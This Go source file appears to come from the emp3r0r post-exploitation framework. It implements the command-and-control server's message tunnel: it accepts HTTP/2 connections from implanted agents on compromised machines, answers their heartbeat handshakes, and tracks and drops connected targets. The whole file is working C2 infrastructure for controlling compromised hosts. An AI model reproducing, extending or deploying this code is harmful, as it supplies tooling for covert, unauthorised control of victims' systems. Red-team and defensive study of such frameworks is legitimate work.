package cc

import (
	"context"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// handleMessageTunnel processes JSON C&C tunnel connections.
func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
	lastHandshake := time.Now()
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		LogError("handleMessageTunnel: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer func() {
		LogDebug("handleMessageTunnel exiting")
		for t, c := range Targets {
			if c.Conn == conn {
				TargetsMutex.RLock()
				delete(Targets, t)
				TargetsMutex.RUnlock()
				LogAlert(color.FgHiRed, "[%d] Agent dies", c.Index)
				LogMsg("[%d] agent %s disconnected", c.Index, strconv.Quote(t.Tag))
				ListTargets()
				break
			}
		}
		_ = conn.Close()
		cancel()
		LogDebug("handleMessageTunnel exited")
	}()
	in := json.NewDecoder(conn)
	out := json.NewEncoder(conn)
	var msg emp3r0r_def.MsgTunData
	go func() {
		defer cancel()
		for ctx.Err() == nil {
			err = in.Decode(&msg)
			if err != nil {
				return
			}
			cmd := ""
			if len(msg.CmdSlice) != 0 {
				cmd = msg.CmdSlice[0]
			}
			if strings.HasPrefix(cmd, "hello") {
				reply := msg
				reply.CmdSlice = msg.CmdSlice
				reply.CmdID = msg.CmdID
				reply.Response = cmd + util.RandStr(util.RandInt(1, 10))
				err = out.Encode(reply)
				if err != nil {
					LogWarning("Failed to answer hello to agent %s", msg.Tag)
					return
				}
				lastHandshake = time.Now()
			} else {
				processAgentData(&msg)
			}
			agent := GetTargetFromTag(msg.Tag)
			if agent == nil {
				LogError("No agent found for message: %v", msg)
				return
			}
			shortname := agent.Name
			if Targets[agent].Conn == nil {
				LogAlert(color.FgHiGreen, "[%d] Knock.. Knock...", Targets[agent].Index)
				LogAlert(color.FgHiGreen, "agent %s connected", strconv.Quote(shortname))
			}
			Targets[agent].Conn = conn
			Targets[agent].Ctx = ctx
			Targets[agent].Cancel = cancel
		}
	}()
	for ctx.Err() == nil {
		if time.Since(lastHandshake) > 2*time.Minute {
			LogDebug("handleMessageTunnel: timeout for agent (%s)", msg.Tag)
			return
		}
		util.TakeABlink()
	}
}
